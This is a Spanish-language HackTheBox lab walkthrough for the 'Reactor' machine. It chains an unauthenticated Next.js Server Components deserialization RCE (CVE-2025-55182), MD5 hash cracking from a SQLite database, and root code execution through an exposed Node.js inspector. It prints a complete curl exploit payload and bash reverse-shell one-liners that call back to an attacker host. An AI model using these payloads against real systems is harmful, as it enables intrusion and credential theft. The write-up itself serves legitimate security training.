---
title: "Reactor — HackTheBox (Easy/Linux)"
machine: "Reactor"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
tags: ["CVE", "SQLi", "RCE", "Privesc", "Web"]
retired: true
summary: "Reactor es una máquina Linux de dificultad Easy en HackTheBox que presenta una cadena de ataque moderna centrada en el framework Next.js 15 y el abuso del inspe"
draft: false
---
---

## Índice

---

## Descripción General

Reactor es una máquina Linux de dificultad **Easy** en HackTheBox que presenta una cadena de ataque moderna centrada en el framework **Next.js 15** y el abuso del **inspector de Node.js**.

La máquina expone una aplicación web de monitoreo nuclear ficticia construida con Next.js 15.0.3 usando React Server Components. La explotación aprovecha una vulnerabilidad de deserialización insegura (CVE-2025-55182) para obtener RCE sin autenticación, seguida de extracción de credenciales desde una base de datos SQLite y escalada de privilegios mediante el debugger de Node.js corriendo como root.

**Tecnologías clave:** Next.js 15, React Server Components, Node.js Inspector, SQLite, SSH, MD5

---

## Reconocimiento

### Escaneo de Puertos

```bash
nmap -p- --min-rate 5000 -oN reactor_full.nmap 10.129.2.96
```

**Puertos abiertos:**

| Puerto | Estado | Servicio |
| --- | --- | --- |
| 22/tcp | open | SSH |
| 3000/tcp | open | HTTP |

### Escaneo de Versiones y Scripts

```bash
nmap -sC -sV -p 22,3000 -oN reactor_services.nmap 10.129.2.96
```

**Resultados:**

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 3000/tcp | HTTP | Next.js 15.0.3 |

---

## Enumeración Web

### Tecnologías Detectadas (Wappalyzer)

- Framework: **Next.js 15.0.3**
- Librería: **React**
- Renderizado: **SSR / RSC (React Server Components)**

### Aplicación — ReactorWatch

La web expone un dashboard de monitoreo llamado **REACTORWATCH — Core Monitoring System v3.2.1** perteneciente a **Nuclear Dynamics Corp**, Facility **SITE-7**.

**Personal identificado:**

| Usuario | Rol | Estado |
| --- | --- | --- |
| Dr. Elena Rodriguez | Lead Nuclear Engineer | ONLINE |
| Marcus Kim | Senior Technician | ONLINE |
| James Thompson | Safety Officer | OFFLINE |

> Estos nombres son potenciales usernames para ataques de credenciales.
> 

### Análisis del Código Fuente

La inspección del HTML reveló el uso de **React Server Components** mediante el patrón `self.__next_f.push(...)`, confirmando que la aplicación usa Server Actions.

**BuildId identificado:** `L3bimJe_3LvBcFWAnK5L4`

**Chunks JS encontrados:**

- `/_next/static/chunks/webpack-db0a529a99835594.js`
- `/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js`
- `/_next/static/chunks/517-d083b552e04dead1.js`
- `/_next/static/chunks/main-app-4fbb4b1f318e39a0.js`

El `_buildManifest.js` confirmó que la app solo expone `/_app` y `/_error` — es una SPA sin rutas adicionales visibles. Sin embargo, el servidor procesa correctamente requests `POST` con el header `Next-Action`, confirmando la vulnerabilidad.

---

## Acceso Inicial — RCE via CVE-2025-55182

### Vulnerabilidad

**CVE-2025-55182 — React2Shell**

Next.js 15.0.3 es vulnerable a **prototype pollution + deserialización insegura** en el handler de React Server Components. Permite a un atacante no autenticado ejecutar código arbitrario en el servidor inyectando un payload en el header `Next-Action`.

**Mecanismo:**

- El campo `_response._formData.get` se controla para apuntar al constructor de `Function`
- Se contamina `Object.prototype` via `$1:__proto__:then` para controlar el flujo de resolución del chunk RSC
- El campo `_prefix` se evalúa como código JavaScript en el proceso de Node.js

### Consideraciones Importantes

> **Por qué usar `exec()` en lugar de `execSync()`:** `execSync` bloquea el event loop de Node.js, lo que provoca un error interno y hace que el payload falle silenciosamente. Con `exec()` el comando corre de forma asíncrona. El `&` al final asegura que la reverse shell se ejecute en background sin bloquear el proceso.
> 

> **Alternativa con Base64:** Para evitar problemas de escapado de comillas, se puede encodear la reverse shell en base64:
> 
> 
> ```bash
> echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' | base64
> # Usar en el payload:
> .execSync('echo <BASE64> | base64 -d | bash')
> ```
> 

### Ejecución

**Terminal 1 — Listener:**

```bash
nc -lvnp 4444
```

**Terminal 2 — Exploit:**

```bash
curl -X POST http://10.129.2.96:3000/ \
  -H "Next-Action: x" \
  -H "User-Agent: Mozilla/5.0" \
  --data-binary $'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require(\'child_process\').exec(\'bash -c \\"bash -i >& /dev/tcp/10.10.14.196/4444 0>&1\\"&\');","_formData":{"get":"$1:constructor:constructor"}}}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n' \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
```

### Resultado

```
connect to [10.10.14.196] from (UNKNOWN) [10.129.2.96] 37972
node@reactor:/opt/reactor-app$
```

Shell obtenida como usuario `node` en `/opt/reactor-app`.

### Estabilización de Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Post-Explotación — Enumeración Interna

### Estructura de la Aplicación

```bash
ls /opt/reactor-app
# app  next.config.js  node_modules  package.json  package-lock.json  reactor.db
```

Se identifica inmediatamente `reactor.db` — una base de datos SQLite en el directorio raíz de la aplicación.

### Extracción de la Base de Datos

```bash
sqlite3 reactor.db ".tables"
# sensor_logs  users

sqlite3 reactor.db "SELECT * FROM users;"
# 1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
# 2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

**Hashes extraídos:**

| ID | Usuario | Hash MD5 | Rol |
| --- | --- | --- | --- |
| 1 | admin | `a203b22191d744a4e70ada5c101b17b8` | administrator |
| 2 | engineer | `39d97110eafe2a9a68639812cd271e8e` | operator |

---

## Movimiento Lateral — Cracking de Hash

Los hashes MD5 se crackearon usando **CrackStation**:

| Usuario | Hash | Contraseña |
| --- | --- | --- |
| engineer | `39d97110eafe2a9a68639812cd271e8e` | `reactor1` |
| admin | `a203b22191d744a4e70ada5c101b17b8` | *(no crackeado)* |

### Acceso SSH

```bash
ssh engineer@10.129.2.96
# Password: reactor1
```

```
engineer@reactor:~$
```

**Flag de usuario:**

```bash
cat ~/user.txt
```

---

## Escalada de Privilegios — Node.js Inspector

### Enumeración de Procesos

```bash
ps aux | grep root
```

**Proceso clave identificado:**

```
root  1407  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Un proceso Node.js corre como **root** con el flag `--inspect`, exponiendo el debugger de Node.js en `127.0.0.1:9229`. Este puerto solo es accesible localmente.

### Técnica: SSH Port Forwarding

Se usa SSH local port forwarding para tunelizar el puerto del debugger hacia la máquina atacante:

```bash
# Desde la máquina atacante
ssh -L 9229:127.0.0.1:9229 engineer@10.129.2.96
```

Esto redirige `localhost:9229` (atacante) → `127.0.0.1:9229` (objetivo).

### Conexión al Debugger

```bash
node inspect 127.0.0.1:9229
```

### Ejecución de Código como Root

**Leer root.txt directamente:**

```jsx
exec('process.mainModule.require("child_process").execSync("cat /root/root.txt").toString()')
```

**Obtener reverse shell de root:**

Terminal 1:

```bash
nc -lvnp 5555
```

En el debugger:

```jsx
exec('process.mainModule.require("child_process").exec("bash -c \\"bash -i >& /dev/tcp/10.10.14.196/5555 0>&1\\"&")')
```

### Resultado

```
connect to [10.10.14.196] from (UNKNOWN) [10.129.2.96] 46808
root@reactor:/#
```

---

## Flags

| Flag | Valor |
| --- | --- |
| user.txt | *(obtenida como engineer vía SSH)* |
| root.txt | `5d658c1203feec46b668acda42765dba` |

---

## Resumen de la Cadena de Ataque

```
┌──────────────────────────────────────────────────────────────────┐
│              REACTOR — Cadena de Ataque                          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Next.js 15.0.3 en puerto 3000                                   │
│         │                                                        │
│         ▼                                                        │
│  CVE-2025-55182 (React2Shell)                                    │
│  Prototype Pollution + Deserialización RSC                       │
│         │                                                        │
│         ▼                                                        │
│  RCE sin autenticación via header Next-Action                    │
│  Shell como usuario 'node'                                       │
│         │                                                        │
│         ▼                                                        │
│  /opt/reactor-app/reactor.db (SQLite)                            │
│  Hash MD5 → engineer:reactor1                                    │
│         │                                                        │
│         ▼                                                        │
│  SSH como engineer ──────────────────► user.txt ✓               │
│         │                                                        │
│         ▼                                                        │
│  Proceso root: node --inspect=127.0.0.1:9229                     │
│         │                                                        │
│         ▼                                                        │
│  SSH Port Forwarding (-L 9229:127.0.0.1:9229)                   │
│         │                                                        │
│         ▼                                                        │
│  node inspect → Ejecución de código JS como root                 │
│         │                                                        │
│         ▼                                                        │
│  Shell de root ──────────────────────► root.txt ✓               │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## Herramientas Utilizadas

- **nmap** — Escaneo de puertos y detección de versiones
- **Wappalyzer** — Fingerprinting de tecnologías web
- **curl** — Envío del payload de explotación
- **nc (netcat)** — Listener para reverse shells
- **sqlite3** — Extracción de datos de la base de datos
- **CrackStation** — Cracking online de hashes MD5
- **ssh** — Acceso remoto y port forwarding
- **node inspect** — Conexión al debugger de Node.js
- **Python** — Scripts de enumeración de chunks JS

---

> Writeup por **4Pr3nd1z** — Mayo 2026
>
